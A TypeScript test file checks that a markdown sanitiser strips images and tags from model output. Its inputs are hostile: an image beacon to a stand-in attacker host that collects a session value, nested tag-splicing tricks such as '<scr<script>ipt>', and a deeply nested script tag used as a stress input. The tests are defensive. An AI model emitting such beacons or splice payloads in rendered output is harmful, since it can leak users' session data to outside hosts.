import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Streamdown } from "streamdown";
import { describe, expect, it } from "vitest";
import { stripModelImages } from "./model-markdown";

const BEACON = "https://attacker.example/collect?session=abc";

function render(markdown: string): string {
  return renderToStaticMarkup(createElement(Streamdown as never, { children: markdown } as never));
}

describe("stripModelImages", () => {
  it("renders no fetching element for an inline remote image", () => {
    const html = render(stripModelImages(`Here you go: ![](${BEACON})`));
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toContain("attacker.example");
  });

  it("renders no fetching element for a reference-style remote image", () => {
    const markdown = `Look: ![chart][beacon]\n\n[beacon]: ${BEACON}\n`;
    const stripped = stripModelImages(markdown);
    expect(stripped).not.toContain("![");
    const html = render(stripped);
    expect(html).not.toMatch(/<img\b/i);
  });

  it("renders no fetching element for a raw <img> tag", () => {
    const html = render(stripModelImages(`<img src="${BEACON}">`));
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toContain("attacker.example");
  });

  it("strips a nested tag, which one pass would splice back into a whole one", () => {
    expect(stripModelImages(`<im<img src="${BEACON}">g src="${BEACON}">`)).not.toContain(
      "attacker.example"
    );
    expect(stripModelImages("<scr<script>ipt>")).toBe("");
  });

  it("bails out safely on nesting too deep to unwrap, instead of looping on it", () => {
    // Each layer needs one more pass, so this is the shape that makes the strip quadratic.
    let nested = `<script src="${BEACON}">`;
    for (let i = 0; i < 20_000; i++) nested = `<scr${nested}ipt>`;

    const started = performance.now();
    const stripped = stripModelImages(nested);
    const elapsed = performance.now() - started;

    // No bracket survives, so nothing can parse as an element — the URL is left as inert prose.
    expect(stripped).not.toContain("<script");
    expect(stripped).not.toContain("<");
    expect(render(stripped)).not.toMatch(/<script\b/i);
    expect(elapsed).toBeLessThan(1_000);
  });

  it("strips an image hidden inside a code fence", () => {
    const stripped = stripModelImages(`\`\`\`\n![](${BEACON})\n\`\`\``);
    expect(stripped).not.toContain("attacker.example");
  });

  it("keeps the alt text as prose", () => {
    expect(stripModelImages(`See ![the run graph](${BEACON}) above.`)).toBe(
      "See the run graph above."
    );
  });

  it("leaves ordinary markdown, including links, untouched", () => {
    const markdown = "**bold** and [a run](https://cloud.trigger.dev/runs/1)";
    expect(stripModelImages(markdown)).toBe(markdown);
  });
});
